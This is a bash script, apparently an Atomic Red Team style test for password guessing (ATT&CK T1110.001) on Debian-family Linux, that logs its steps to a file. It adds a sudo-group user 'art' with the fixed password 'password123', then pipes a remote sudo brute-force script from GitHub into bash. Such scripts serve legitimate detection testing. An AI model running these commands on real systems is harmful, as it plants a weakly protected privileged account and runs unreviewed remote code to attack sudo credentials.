#!/bin/bash

# Variables for log file
log_dir="Linux_output/Credential_access"
log_file="${log_dir}/T1110.001_Credential_access.txt"

# Create the log directory if it does not exist
mkdir -p "$log_dir"

# Function to log output to both terminal and file
log_output() {
    local message="$1"
    echo "$message"
    echo "$(date '+%Y-%m-%d %H:%M:%S %Z') $message" >> "$log_file"
}

# Check OS distribution
if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then
    log_output "Debian"
else
    log_output "NOT Debian"
    exit 1
fi

# Check if pam_tally is configured
if grep -Rq "pam_tally" /etc/pam.d/*; then
    log_output "pam_tally configured"
else
    log_output "pam_tally not configured"
fi

# Check if openssl is installed
if [ -x "$(command -v openssl)" ]; then
    log_output "openssl is installed"
else
    log_output "openssl is NOT installed"
    exit 1
fi

# Check if sudo is installed
if [ -x "$(command -v sudo)" ]; then
    log_output "sudo is installed"
else
    log_output "sudo is NOT installed"
    exit 1
fi

# Check if curl is installed
if [ -x "$(command -v curl)" ]; then
    log_output "curl is installed"
else
    log_output "curl is NOT installed"
    exit 1
fi

# Create user 'art' with sudo privileges
log_output "Creating user 'art' with sudo privileges..."
useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art 2>&1 | tee -a "$log_file"

# Switch to user 'art' and run commands
log_output "Switching to user 'art' and executing script..."

su art <<'EOF' | tee -a "$log_file"
cd /tmp
log_output "Downloading and executing sudo_bruteforce.sh script..."
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash 2>&1 | tee -a "$log_file"
EOF

# Provide completion message
log_output "Script execution completed."

# Provide final feedback
echo "Execution details saved in: $log_file"
